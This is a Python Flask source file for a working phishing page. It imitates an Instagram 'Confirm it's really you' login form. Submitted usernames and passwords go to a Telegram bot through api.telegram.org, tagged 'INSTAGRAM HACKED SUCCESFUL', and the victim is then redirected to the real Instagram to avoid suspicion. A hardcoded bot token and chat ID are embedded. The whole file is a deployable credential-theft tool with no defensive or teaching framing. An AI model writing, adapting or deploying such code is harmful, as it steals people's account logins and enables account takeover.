from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8631015985:AAGrZN8kIRFhOlxuvnTHL_lyYphice1Rn9Y")
CHAT_ID = os.environ.get("CHAT_ID", "8975860234")

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login page</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: #fafafa;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .box {
            width: 360px;
            background: white;
            border: 1px solid #ddd;
            padding: 35px;
            text-align: center;
        }

        .logo {
            font-family: cursive;
            font-size: 42px;
            margin-bottom: 10px;
        }

        .demo {
            color: #0095f6;
            font-weight: bold;
            font-size: 12px;
            margin-bottom: 15px;
        }

        .info {
            color: #777;
            font-size: 13px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 11px;
            margin-top: 10px;
            border: 0;
            border-radius: 7px;
            background: #0095f6;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        .success {
            margin-top: 15px;
            padding: 10px;
            background: #e8f8ed;
            color: #16833b;
            border-radius: 5px;
            font-size: 13px;
        }

        .error {
            margin-top: 15px;
            padding: 10px;
            background: #ffecec;
            color: #c00;
            border-radius: 5px;
            font-size: 13px;
        }

        .warning {
            margin-top: 20px;
            padding: 10px;
            background: #fff8df;
            color: #765d00;
            font-size: 11px;
            border-radius: 5px;
        }
    </style>
</head>

<body>

<div class="box">

    <div class="logo">Instagram</div>

    <div class="demo">Confirm it's really you</div>

    <div class="info">
        Instagram-Login page Login your instagram account
        confirm it's really you
    </div>

    <form method="POST">

        <input
            type="text"
            name="username"
            placeholder="Username"
            required
        >

        <input
            type="text"
            name="name"
            placeholder="Password"
            required
        >

        <button type="submit">
            Continue
        </button>

    </form>

    {% if message %}
        <div class="{{ 'success' if success else 'error' }}">
            {{ message }}
        </div>

        {% if success %}
        <script>
            setTimeout(function() {
                window.location.href = "https://www.instagram.com/";
            }, 2000);
        </script>
        {% endif %}
    {% endif %}

    <div class="warning">
        Never Share Your Passwords , OTP , with Anyone
        Staff will not aks you to reveal and password and OTPs
    </div>

</div>

</body>
</html>
"""


@app.route("/", methods=["GET", "POST"])
def home():

    message = ""

    success = False

    if request.method == "POST":

        username = request.form.get("username", "").strip()
        name = request.form.get("name", "").strip()

        telegram_message = (
            "FRN13DNS HACKED\n\n"
            f"Username: {username}\n"
            f"Name: {name}\n\n"
            "INSTAGRAM HACKED SUCCESFUL."
        )

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        try:
            r = requests.post(
                url,
                data={
                    "chat_id": CHAT_ID,
                    "text": telegram_message
                },
                timeout=10
            )

            if r.ok:
                success = True
                message = "Submitted successfully!"
            else:
                message = "Login failed."

        except requests.RequestException:
            message = "⚠️ Could not connect to instagram."

    return render_template_string(
        HTML,
        message=message,
        success=success
    )


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=3000,
        debug=True
    )
